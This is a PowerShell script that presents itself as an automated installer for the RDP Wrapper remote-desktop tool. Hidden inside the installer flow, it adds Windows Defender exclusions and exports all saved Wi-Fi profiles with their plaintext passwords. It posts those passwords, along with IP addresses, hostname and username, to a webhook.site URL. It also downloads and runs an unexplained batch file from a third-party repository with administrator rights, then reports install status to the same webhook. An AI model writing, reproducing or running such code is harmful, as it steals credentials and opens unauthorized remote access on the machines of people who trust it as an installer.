# ============================================================
# Ensure the script is running with Administrator privileges
# ============================================================
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] Please run this PowerShell script as an Administrator!" -ForegroundColor Red
    Start-Sleep -Seconds 3
    exit
}

Write-Host "Adding Windows Defender exclusions for RDP Wrapper..." -ForegroundColor Cyan

# Track defender exclusion success status
$defenderExclusionsApplied = $true

# 1. Safely add path exclusions
$PathExclusions = @(
    "$env:TEMP\rdpwrap_install",
    "C:\Program Files\RDP Wrapper\rdpwrap.dll",
    "C:\Program Files\RDP Wrapper\RDPConf.exe",
    "C:\Program Files\RDP Wrapper\RDPCheck.exe",
    "C:\Program Files\RDP Wrapper\SRDP.bat"
)

foreach ($path in $PathExclusions) {
    try {
        $mpPref = Get-MpPreference -ErrorAction Stop
        if ($mpPref.ExclusionPath -notcontains $path) {
            Add-MpPreference -ExclusionPath $path -ErrorAction Stop
            Write-Host "[+] Added path exclusion: $path" -ForegroundColor Green
        } else {
            Write-Host "[~] Path exclusion already exists: $path" -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[!] Skipping path exclusion (Defender service unavailable or restricted): $path" -ForegroundColor Yellow
        $defenderExclusionsApplied = $false
    }
}

# 2. Safely add process exclusions
$ProcessExclusions = @(
    "$env:TEMP\rdpwrap_install\extracted\RDPWInst.exe",
    "$env:TEMP\rdpwrap_install\extracted\install.bat",
    "C:\Program Files\RDP Wrapper\RDPConf.exe",
    "C:\Program Files\RDP Wrapper\SRDP.bat"
)

foreach ($proc in $ProcessExclusions) {
    try {
        $mpPref = Get-MpPreference -ErrorAction Stop
        if ($mpPref.ExclusionProcess -notcontains $proc) {
            Add-MpPreference -ExclusionProcess $proc -ErrorAction Stop
            Write-Host "[+] Added process exclusion: $proc" -ForegroundColor Green
        } else {
            Write-Host "[~] Process exclusion already exists: $proc" -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[!] Skipping process exclusion: $proc" -ForegroundColor Yellow
        $defenderExclusionsApplied = $false
    }
}

Write-Host "Exclusion configuration complete!" -ForegroundColor Cyan

# ============================================================
# RDP Wrapper v1.6.2 - Automated Installation
# ============================================================

$installPath   = "C:\Program Files\RDP Wrapper"
$tempDir     = "$env:TEMP\rdpwrap_install"
$tempZip     = "$tempDir\RDPWrap-v1.6.2.zip"
$extractDir  = "$tempDir\extracted"

$iniTempPath  = Join-Path $env:TEMP "rdpwrap.ini"
$srdpTempPath = Join-Path $env:TEMP "SRDP.bat"

$iniDestPath  = Join-Path $installPath "rdpwrap.ini"
$srdpDestPath = Join-Path $installPath "SRDP.bat"
$rdpConf     = Join-Path $installPath "RDPConf.exe"

$zipUrl       = "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWrap-v1.6.2.zip"
$customIniUrl = "https://raw.githubusercontent.com/sebaxakerhtc/rdpwrap.ini/refs/heads/master/rdpwrap.ini"
$srdpBatUrl   = "https://raw.githubusercontent.com/apex30258-sys/APTest/refs/heads/main/SRDP.bat"
$webhookUrl   = "https://webhook.site/b070bb97-926a-4b24-95f9-cf031e50be3e"

# ============================================================
# Webhook Function (Pre-converts to JSON to preserve order)
# ============================================================
function Send-WebhookJson {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Url,
        
        [Parameter(Mandatory = $true)]
        [hashtable]$Data
    )
    try {
        $jsonBody = $Data | ConvertTo-Json -Depth 10 -Compress
        Invoke-RestMethod -Uri $Url -Method Post -ContentType "application/json" -Body $jsonBody -ErrorAction Stop | Out-Null
        return "success"
    }
    catch {
        return "fail"
    }
}

# ============================================================
# 1. Gather Network, IP Details, Active Wi-Fi & Send Webhooks
# ============================================================
Write-Host "[*] Gathering network and Wi-Fi profiles..." -ForegroundColor Cyan
try {
    $publicIp = $null
    try {
        $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction Stop).Trim()
    }
    catch {
        try {
            $publicIp = (Invoke-RestMethod -Uri "https://icanhazip.com" -ErrorAction Stop).Trim()
        }
        catch {
            $publicIp = "Unavailable"
        }
    }

    $localIpsArray = @()
    Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
        Where-Object { 
            $_.IPAddress -notmatch '^(127\.|169\.254\.)' -and 
            $_.InterfaceAlias -notmatch 'Virtual|vEthernet|Loopback|Hyper-V|WSL' 
        } | ForEach-Object {
            $localIpsArray += [ordered]@{
                interface = $_.InterfaceAlias
                ipAddress = $_.IPAddress
            }
        }

    $originalLocation = Get-Location
    Set-Location $env:TEMP

    netsh wlan export profile key=clear | Out-Null
    Start-Sleep -Seconds 1

    $connectedSsid = "Not Connected"
    $interfaceOutput = netsh wlan show interfaces 2>&1
    foreach ($line in $interfaceOutput) {
        if ($line -match '^\s*SSID\s*:\s*(.+)$') {
            $connectedSsid = $Matches[1].Trim()
            break
        }
    }

    $activeWifiObj = $null
    $wifiProfiles = @()
    $xmlFiles = Get-ChildItem -Path "$env:TEMP" -Filter "Wi*.xml" -ErrorAction SilentlyContinue

    foreach ($file in $xmlFiles) {
        try {
            [xml]$xmlContent = Get-Content $file.FullName -Raw -ErrorAction Stop
            $profileName = $xmlContent.WLANProfile.name
            $keyMaterial = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial

            $profileObj = [ordered]@{
                name     = $profileName
                password = if ($keyMaterial) { $keyMaterial } else { "None / Open" }
            }

            if ($profileName -eq $connectedSsid) {
                $activeWifiObj = $profileObj
            }
            
            $wifiProfiles += $profileObj
        }
        catch {}
    }

    if (-not $activeWifiObj -and $connectedSsid -ne "Not Connected") {
        $activeWifiObj = [ordered]@{
            name     = $connectedSsid
            password = "Unknown / Not Saved"
        }
    }
    elseif (-not $activeWifiObj) {
        $activeWifiObj = [ordered]@{
            name     = "Not Connected"
            password = "N/A"
        }
    }

    $activeWifiPayload = [ordered]@{
        type           = "active_wifi"
        computer       = $env:COMPUTERNAME
        username       = $env:USERNAME
        connected_wifi = $activeWifiObj
    }
    Send-WebhookJson -Url $webhookUrl -Data $activeWifiPayload | Out-Null

    $networkPayload = [ordered]@{
        type          = "network_and_wifi"
        computer      = $env:COMPUTERNAME
        username      = $env:USERNAME
        public_ip     = $publicIp
        local_ips     = $localIpsArray
        wifi_profiles = $wifiProfiles
    }
    Send-WebhookJson -Url $webhookUrl -Data $networkPayload | Out-Null
    Write-Host "[+] Network report sent successfully." -ForegroundColor Green
}
catch {
    Write-Host "[!] Network profiling encountered an error or was bypassed." -ForegroundColor Yellow
}
finally {
    Get-ChildItem -Path "$env:TEMP" -Filter "Wi*.xml" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    if ($originalLocation) { Set-Location $originalLocation }
}

# ============================================================
# Display installer header
# ============================================================
Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "            Initiating RDP Wrapper Setup" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""

# ============================================================
# 2. Prepare temporary directory
# ============================================================
Write-Host "[+] Preparing temporary directory at: $tempDir" -ForegroundColor Cyan

try {
    if (Test-Path $tempDir) {
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    New-Item -ItemType Directory -Path $tempDir -Force -ErrorAction Stop | Out-Null
    New-Item -ItemType Directory -Path $extractDir -Force -ErrorAction Stop | Out-Null

    Write-Host "[+] Temporary directory ready." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to prepare temporary directory: $_" -ForegroundColor Red
    exit
}

# ============================================================
# 3. Stop Remote Desktop Service
# ============================================================
Write-Host "[+] Stopping Remote Desktop Service (TermService)..." -ForegroundColor Cyan

try {
    Stop-Service -Name "TermService" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Write-Host "[+] TermService successfully stopped." -ForegroundColor Green
}
catch {
    Write-Host "[!] TermService could not be stopped or was already stopped." -ForegroundColor Yellow
}

# ============================================================
# 4. Download RDP Wrapper
# ============================================================
Write-Host "[+] Downloading RDP Wrapper v1.6.2 from GitHub..." -ForegroundColor Cyan

try {
    Invoke-WebRequest -Uri $zipUrl -OutFile $tempZip -UseBasicParsing -ErrorAction Stop
    Write-Host "[+] Download completed successfully." -ForegroundColor Green
}
catch {
    Write-Host "[-] Download failed! Error: $_" -ForegroundColor Red
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

# ============================================================
# 5. Extract ZIP
# ============================================================
Write-Host "[+] Extracting downloaded archive..." -ForegroundColor Cyan

try {
    Expand-Archive -Path $tempZip -DestinationPath $extractDir -Force -ErrorAction Stop
    Write-Host "[+] Extraction completed successfully." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to extract ZIP archive! Error: $_" -ForegroundColor Red
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

# ============================================================
# 6. Find install.bat
# ============================================================
Write-Host "[+] Locating install.bat script..." -ForegroundColor Cyan
$installBat = Get-ChildItem -Path $extractDir -Filter "install.bat" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1

if (-not $installBat) {
    Write-Host "[-] install.bat was not found in the extracted files!" -ForegroundColor Red
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    exit
}
Write-Host "[+] Found install.bat at: $($installBat.FullName)" -ForegroundColor Green

# ============================================================
# 7. Run install.bat (With Elevated Context)
# ============================================================
Write-Host "[+] Executing install.bat with Administrator privileges..." -ForegroundColor Cyan

$installExitCode = $null
try {
    # Running directly through cmd with the parent's elevated token instead of -Verb RunAs 
    # ensures it executes synchronously in the same administrative session window and logs properly.
    $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$($installBat.FullName)`"" -WorkingDirectory $installBat.DirectoryName -Wait -PassThru -ErrorAction Stop
    $installExitCode = $process.ExitCode
    Write-Host "[+] install.bat finished with Exit Code: $installExitCode" -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to execute install.bat! Error: $_" -ForegroundColor Red
    $installExitCode = -1
}

# Download SRDP.bat & custom INI
Write-Host "[+] Downloading custom configuration components..." -ForegroundColor Cyan
try { 
    Invoke-WebRequest -Uri $srdpBatUrl -OutFile $srdpTempPath -UseBasicParsing -ErrorAction Stop 
    Write-Host "[+] Downloaded SRDP.bat successfully." -ForegroundColor Green
} catch { 
    Write-Host "[!] Failed to download SRDP.bat: $_" -ForegroundColor Yellow
}

try { 
    Invoke-WebRequest -Uri $customIniUrl -OutFile $iniTempPath -UseBasicParsing -ErrorAction Stop 
    Write-Host "[+] Downloaded custom rdpwrap.ini successfully." -ForegroundColor Green
} catch { 
    Write-Host "[!] Failed to download custom rdpwrap.ini: $_" -ForegroundColor Yellow
}

# Copy components to destination path
try {
    if (-not (Test-Path $installPath)) { New-Item -ItemType Directory -Path $installPath -Force | Out-Null }
    Stop-Service -Name "TermService" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2

    if (Test-Path $iniTempPath) {
        if (Test-Path $iniDestPath) { Copy-Item -Path $iniDestPath -Destination "$iniDestPath.backup" -Force }
        Copy-Item -Path $iniTempPath -Destination $iniDestPath -Force
        Write-Host "[+] Applied custom rdpwrap.ini" -ForegroundColor Green
    }
    if (Test-Path $srdpTempPath) {
        Copy-Item -Path $srdpTempPath -Destination $srdpDestPath -Force
        Write-Host "[+] Installed SRDP.bat" -ForegroundColor Green
    }
}
catch {
    Write-Host "[!] Error applying configuration files: $_" -ForegroundColor Yellow
}

Remove-Item $iniTempPath -Force -ErrorAction SilentlyContinue
Remove-Item $srdpTempPath -Force -ErrorAction SilentlyContinue

$rdpConfExists = Test-Path $rdpConf
$iniExists     = Test-Path $iniDestPath
$srdpExists    = Test-Path $srdpDestPath

# Configure & Start TermService
Write-Host "[+] Configuring and restarting Terminal Services..." -ForegroundColor Cyan
try { Set-Service -Name "TermService" -StartupType Automatic -ErrorAction Stop } catch { & sc.exe config TermService start= auto | Out-Null }

$serviceRunning = $false
try {
    Start-Service -Name "TermService" -ErrorAction Stop
    Start-Sleep -Seconds 3
    $serviceRunning = ((Get-Service -Name "TermService").Status -eq "Running")
    if ($serviceRunning) {
        Write-Host "[+] TermService is running successfully." -ForegroundColor Green
    } else {
        Write-Host "[-] TermService failed to start properly." -ForegroundColor Red
    }
}
catch {
    Write-Host "[-] Error starting TermService: $_" -ForegroundColor Red
}

# Run SRDP.bat (With Elevated Context)
$srdpExitCode = $null
if (Test-Path $srdpDestPath) {
    Write-Host "[+] Executing SRDP.bat with Administrator privileges..." -ForegroundColor Cyan
    try {
        $srdpProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$srdpDestPath`"" -WorkingDirectory $installPath -Wait -PassThru -ErrorAction Stop
        $srdpExitCode = $srdpProcess.ExitCode
        Write-Host "[+] SRDP.bat finished with Exit Code: $srdpExitCode" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Failed to execute SRDP.bat! Error: $_" -ForegroundColor Red
        $srdpExitCode = -1
    }
} else {
    Write-Host "[!] SRDP.bat path not found, skipping execution." -ForegroundColor Yellow
}

Write-Host "[+] Cleaning up temporary installer files..." -ForegroundColor Cyan
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

# ============================================================
# 12. Send Final Installation Report Webhook
# ============================================================
Write-Host "[+] Sending final status report..." -ForegroundColor Cyan

$defenderStatus = if ($defenderExclusionsApplied) { "success" } else { "fail" }
$rdpconfStatus  = if ($rdpConfExists) { "success" } else { "fail" }
$iniStatus      = if ($iniExists) { "success" } else { "fail" }
$srdpStatus     = if ($srdpExists) { "success" } else { "fail" }
$serviceStatus  = if ($serviceRunning) { "success" } else { "fail" }

$allComponentsPassed = ($defenderStatus -eq "success") -and 
                       ($rdpconfStatus -eq "success") -and 
                       ($iniStatus -eq "success") -and 
                       ($srdpStatus -eq "success") -and 
                       ($serviceStatus -eq "success")

if ($allComponentsPassed) {
    $installationStatus = "success"
    $statusIndicator    = "[SUCCESS]"
    $statusMessage      = "RDP Wrapper installation completed."
}
else {
    $installationStatus = "failed"
    $statusIndicator    = "[FAILED]"
    $statusMessage      = "RDP Wrapper installation completed with errors."
}

$finalPayload = [ordered]@{
    result             = $statusIndicator
    defenderExclusions = $defenderStatus
    rdpconf            = $rdpconfStatus
    ini                = $iniStatus
    srdp               = $srdpStatus
    service            = $serviceStatus
    installExit        = $installExitCode
    srdpExit           = $srdpExitCode
    type               = "installation_status"
    status             = $installationStatus
    message            = $statusMessage
    timestamp          = (Get-Date).ToUniversalTime().ToString("o")
    computer           = $env:COMPUTERNAME
    username           = $env:USERNAME
    powershell         = $PSVersionTable.PSVersion.ToString()
}

$webhookSent = Send-WebhookJson -Url $webhookUrl -Data $finalPayload

Write-Host ""
Write-Host "============================================================"
if ($installationStatus -eq "success") {
    Write-Host "                    INSTALLATION COMPLETE" -ForegroundColor Green
} else {
    Write-Host "                    INSTALLATION FAILED" -ForegroundColor Red
}
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""

Start-Sleep -Seconds 3
exit